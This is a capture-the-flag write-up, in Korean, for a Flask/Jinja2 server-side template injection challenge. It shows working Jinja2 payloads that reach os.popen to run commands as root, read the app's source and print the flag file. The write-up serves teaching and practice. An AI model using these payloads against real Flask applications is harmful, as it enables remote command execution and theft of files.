---
ctf_name: "RAMunchers CTF"
challenge_name: "SSTI"
category: "web"
difficulty: "easy"
author: "arkazq"
date: "2026-05-12"
points: 50
tags: [SSTI, Flask, Jinja2, RCE]
---

# SSTI

## 1. 문제 확인

문제 이름이 `SSTI`라서 입력값이 템플릿에 들어가는 부분을 먼저 의심했다.  
페이지에는 기본 AI 모델을 고르는 select 박스와 직접 입력하는 칸이 있었다.

직접 입력값으로 `{{7*7}}`를 넣어 보니 응답에서 `49`가 출력되었다.

```html
<p> So 49 is your favourite model?</p>
```

그래서 사용자 입력이 단순 문자열로 출력되는 것이 아니라 서버에서 한 번 더 렌더링된다고 판단했다.

## 2. 디버그 페이지 확인

없는 경로인 `/robots.txt`로 접근했을 때 실제 robots 파일이 아니라 Flask debug 페이지가 나왔다.  
404 처리에서 `redirect`를 사용하지만 import가 되어 있지 않아서 아래 에러가 발생했다.

```text
NameError: name 'redirect' is not defined
```

traceback에서 `/app/app.py` 경로와 Flask 앱이라는 점을 확인할 수 있었다.  
이후 SSTI로 명령 실행이 가능해진 뒤에는 `/app/app.py`를 직접 읽어서 원인을 확인했다.

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('sed -n 1,120p /app/app.py').read()}}
```

확인한 코드에서 사용자 입력이 f-string에 들어간 뒤 `render_template_string()`으로 넘어가고 있었다.

```python
response = f"""<p> So {user} is your favourite model?</p>"""
return render_template_string(response)
```

이 때문에 `{{7*7}}` 같은 입력이 서버에서 템플릿 문법으로 처리되었다.

## 3. 익스플로잇

Flask/Jinja2 SSTI에서 자주 쓰는 방식으로 `os.popen()`에 접근했다.  
먼저 `id`를 실행해서 명령 실행이 되는지 확인했다.

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

응답에서 root 권한으로 실행되는 것이 보였다.

```text
uid=0(root) gid=0(root) groups=0(root)
```

이제 플래그 파일만 찾으면 되므로 루트 디렉토리를 확인했다.

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('ls -la /').read()}}
```

루트 디렉토리에 `/flag.txt`가 있어서 그대로 읽었다.

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}
```

최종 플래그:

```text
RAM{REDACTED}
```
